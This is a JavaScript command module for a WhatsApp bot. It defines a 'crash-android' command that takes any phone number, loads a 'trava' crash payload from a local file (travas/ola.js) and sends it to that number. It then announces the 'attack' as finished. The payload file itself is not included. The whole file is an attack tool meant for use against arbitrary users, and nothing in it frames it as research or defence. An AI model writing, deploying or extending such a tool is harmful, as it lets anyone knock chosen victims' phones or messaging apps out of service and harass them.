import fs from 'fs';
import path from 'path';

const crashAndroidMisa = {
    name: 'crash-android',
    alias: ['ca', 'crash', 'ola', 'multi-crash'],
    category: 'tools',
    noPrefix: true,
    isOwner: false,

    run: async (conn, m, { args, command }) => {
        try {
            const chat = m.key.remoteJid;

            if (!args[0]) {
                const textoUso = `✧ ‧₊˚ *MISA CRASH x1* ୧ֹ˖ ⑅ ࣪⊹\n\n✰ \`Uso\`: ${command} [número]`;
                return await conn.sendMessage(chat, { text: textoUso }, { quoted: m });
            }

            const num = args[0].replace(/[^0-9]/g, '');
            if (!num || num.length < 8) {
                return await conn.sendMessage(chat, { text: '❌ *Número inválido.*' }, { quoted: m });
            }
            const targetJid = `${num}@s.whatsapp.net`;

            const pathTrava = path.join(process.cwd(), 'travas', 'ola.js');
            if (!fs.existsSync(pathTrava)) {
                return await conn.sendMessage(chat, { text: '❌ No encontré: `travas/ola.js`' }, { quoted: m });
            }

            const contenidoTrava = fs.readFileSync(pathTrava, 'utf8');

            // 1. Reacción de inicio
            await conn.sendMessage(chat, { react: { text: '🚀', key: m.key } });

            // 2. Envío único
            try {
                await conn.sendMessage(targetJid, { text: contenidoTrava });
                console.log(`[MISA-BOT] Carga enviada a ${num}`);
            } catch (e) {
                console.error(`Error en el envío:`, e);
                return await conn.sendMessage(chat, { text: '❌ Error al enviar la carga.' }, { quoted: m });
            }

            // 3. Confirmación final
            await conn.sendMessage(chat, { react: { text: '💀', key: m.key } });
            await conn.sendMessage(chat, { 
                text: `✅ *Ataque Finalizado*\n> Se envió 1 ráfaga de 'ola.js' a @${num}`,
                mentions: [targetJid]
            }, { quoted: m });

        } catch (err) {
            console.error('Error en crash-android:', err);
        }
    }
};

export default crashAndroidMisa;
